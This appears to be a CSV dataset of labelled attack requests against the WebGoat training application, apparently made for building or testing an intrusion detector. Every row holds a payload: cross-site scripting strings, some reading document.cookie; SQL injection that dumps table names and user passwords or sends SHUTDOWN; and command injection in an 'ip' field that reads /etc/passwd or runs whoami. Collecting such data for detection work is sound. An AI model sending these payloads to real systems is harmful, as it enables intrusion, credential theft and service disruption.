source_app,label,method,path,body,status_code,response_size
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=sohuZGI2,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=TNJlbgYU,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'mz6IDwwn'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=pWsqhVgd,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=jrxv0Iau,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '8290'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '3894'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '6180'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=3s9Uxsui,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'NdjvpaXb'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=PcE7hnLS,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '8755'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,cia/command-injection,"[('_uid', 'uwQT2T4d'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '6914'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,cia/command-injection,"[('_uid', 'QqJwWzLe'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=jR2Swa1z,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=MSP6tVCL,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'bVIyGqim'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=LJvbMsS7,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'dztcHVkn'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '5241'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '4570'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=6AK13swY,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '1731'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=QcBxCkmL,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=XMpGfRZP,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=uyHti16x,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '9989'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,cia/command-injection,"[('_uid', 'yUqn0jiX'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '7377'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=e1H8LaUV,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '3257'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,cia/command-injection,"[('_uid', 'b2HJAl7M'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '5830'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=SACE6rWg,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=xFBFfIUZ,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'RLO2eM2N'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=Rn86qeYI,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '4980'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=6ARxFx4d,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '5858'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'gaQtur5O'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'x1gZnCX4'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '6058'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=twyRsE4r,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'HEyJibqV'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=UVW3Jd5D,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'opEHwqDh'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '5421'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '7910'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,cia/command-injection,"[('_uid', 'EPsGMJjM'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'n7AvCXmN'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '5212'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=WnerBpap,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'NbuaCs3a'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', '6xjBLj05'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', '3Mw9HKIQ'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', '2Z7K8Ybg'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=p5nV2HQL,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=zAW8DTin,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=Q9yFg5xB,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'cSyKp0DW'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'KoBXj0LI'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', '2GoWmkJh'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=T0t4CpGC,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '4189'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '4801'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=POP4R0JO,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=3NMnpOca,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '7434'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '5232'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '2644'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'QtwXWYRK'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'hIbk0Rn9'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '7813'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '2914'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,cia/command-injection,"[('_uid', '519WpIUx'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '5493'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,cia/command-injection,"[('_uid', 'ZEGOL039'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'nYSDBYGi'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '2662'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,cia/command-injection,"[('_uid', 'SlLtv7g5'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'dpzS26Ws'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '6299'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '4805'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,cia/command-injection,"[('_uid', 'Uc2oJrIt'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=geIqyPCz,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=xhj0VGES,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=nDJAbobY,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=icW689mR,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '7636'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '3009'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'xmun9n5T'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '7947'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '8430'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,cia/command-injection,"[('_uid', 'TKJ4ywKp'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=2EwOmFCR,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'jDpperZD'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=d9nEE9uH,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=2wTfX4mr,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'QAJr28Gv'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '3066'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=nebySH3A,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'Wta2h9i7'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '7440'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,cia/command-injection,"[('_uid', 'OOqIS5hc'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '2214'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=jOHuMQiw,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=CCHWGE8L,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=nrYEr4Nc,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'BCHxpaD4'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'Daopkikh'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=E2uhNBn1,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'ME2zcs0k'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=Ojwl3bU1,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'CWjRFF7T'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=iFGwvbd0,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', '2QSmE4ZM'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'YCG7yQkn'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=dRN3l0Hg,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=QpW3krGy,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=hLnJbRBD,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '2382'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '5648'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=J2N14hfo,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=wynpuBrf,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '5112'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,cia/command-injection,"[('_uid', 'tTqDTmYO'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=MijwOKPb,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '1872'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '6972'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=iOJuSWxO,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '5598'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '4290'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '9806'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,cia/command-injection,"[('_uid', 'UCZrP5Io'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '7936'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '2511'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=ebMuL2X9,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=cQ74spyp,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=i40w6K1V,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'z4Oxy06w'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '3192'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,cia/command-injection,"[('_uid', 'AoKVhP2l'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '1124'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '9925'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '3700'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '5499'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=w1MknDMA,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'yXrBNSoY'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '2630'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=tByxe3JV,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '8109'), ('name', ""'; SHUTDOWN--"")]",200,307
